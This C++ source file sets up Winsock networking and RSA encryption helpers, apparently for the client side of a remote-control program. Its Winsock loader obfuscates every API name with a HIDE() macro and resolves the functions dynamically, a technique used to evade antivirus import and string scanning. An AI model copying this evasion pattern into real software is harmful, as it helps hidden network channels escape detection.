#include "../Headers/net_common.h"
#include "../Headers/procutils.h"

#include <vector>

void NetCommon::LoadWSAFunctions() {
    if ( WSAInitialized )
        return;

    HMODULE kernel32 = ProcessUtilities::GetModHandle(ProcessUtilities::freqDLLS::kernel32); // load winsock
    ProcessUtilities::PPROCFN::_LoadLibrary load = ProcessUtilities::GetFunctionAddress<ProcessUtilities::PPROCFN::_LoadLibrary>(kernel32, std::string(HIDE("LoadLibraryA")));

    HMODULE WINSOCK = load(winsock32.c_str());

    // function pointers from winsock
    StartWSA = ProcessUtilities::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
    BindSocket = ProcessUtilities::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
    CloseSocket = ProcessUtilities::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
    CreateSocket = ProcessUtilities::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
    Receive = ProcessUtilities::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
    SendTo = ProcessUtilities::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
    ReceiveFrom = ProcessUtilities::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
    Send = ProcessUtilities::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
    CleanWSA = ProcessUtilities::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
    ConnectSocket = ProcessUtilities::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
    SocketListen = ProcessUtilities::GetFunctionAddress<_listen>(WINSOCK, std::string(HIDE("listen")));
    ShutdownSocket = ProcessUtilities::GetFunctionAddress<_shutdown>(WINSOCK, std::string(HIDE("shutdown")));
    AcceptOnSocket = ProcessUtilities::GetFunctionAddress<_accept>(WINSOCK, std::string(HIDE("accept")));
    HostToNetworkShort = ProcessUtilities::GetFunctionAddress<_htons>(WINSOCK, std::string(HIDE("htons")));
    InternetAddress = ProcessUtilities::GetFunctionAddress<_inet_addr>(WINSOCK, std::string(HIDE("inet_addr")));
    GetHostByName = ProcessUtilities::GetFunctionAddress<_gethostbyname>(WINSOCK, std::string(HIDE("gethostbyname")));

    WORD version = MAKEWORD(2, 2);
    WSAData data = { 0 };

    if ( StartWSA(version, &data) == 0 )
        WSAInitialized = TRUE;
}

BYTESTRING NetCommon::RSADecryptStruct(BYTESTRING data, BIO* bio) {
    std::cout << "decrypting a struct!\n";

    EVP_PKEY* priv = PEM_read_bio_PrivateKey(bio, nullptr, nullptr, nullptr);
    if ( !priv )
        return {};

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(priv, nullptr);
    if ( !ctx ) {
        EVP_PKEY_free(priv);
        return {};
    }

    if ( EVP_PKEY_decrypt_init(ctx) <= 0 ) {
        EVP_PKEY_free(priv);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    size_t     outLen;

    if ( EVP_PKEY_decrypt(ctx, NULL, &outLen, data.data(), data.size()) <= 0 ) {
        EVP_PKEY_free(priv);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    BYTESTRING out(outLen);

    if ( EVP_PKEY_decrypt(ctx, out.data(), &outLen, data.data(), data.size()) <= 0 ) {
        EVP_PKEY_free(priv);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    EVP_PKEY_free(priv);
    EVP_PKEY_CTX_free(ctx);

    out.resize(outLen);

    std::cout << "decrypted the struct!\n";

    return out;
}

BYTESTRING NetCommon::RSAEncryptStruct(BYTESTRING data, BIO* bio) {
    EVP_PKEY* pub = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
    if ( !pub ) {
        std::cout << "bad key when encrypting struct\n";
        CLIENT_DBG("bad key when encrypting struct");
        return {};
    }

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(pub, nullptr);
    if ( !ctx ) {
        EVP_PKEY_free(pub);
        return {};
    }

    if ( EVP_PKEY_encrypt_init(ctx) <= 0 ) {
        EVP_PKEY_free(pub);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    size_t     outLen;
    if ( EVP_PKEY_encrypt(ctx, NULL, &outLen, data.data(), data.size()) <= 0 ) {
        EVP_PKEY_free(pub);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    BYTESTRING out(outLen);

    if ( EVP_PKEY_encrypt(ctx, out.data(), &outLen, data.data(), data.size()) <= 0 ) {
        EVP_PKEY_free(pub);
        EVP_PKEY_CTX_free(ctx);
        return {};
    }

    out.resize(outLen);

    EVP_PKEY_free(pub);
    EVP_PKEY_CTX_free(ctx);

    return out;
}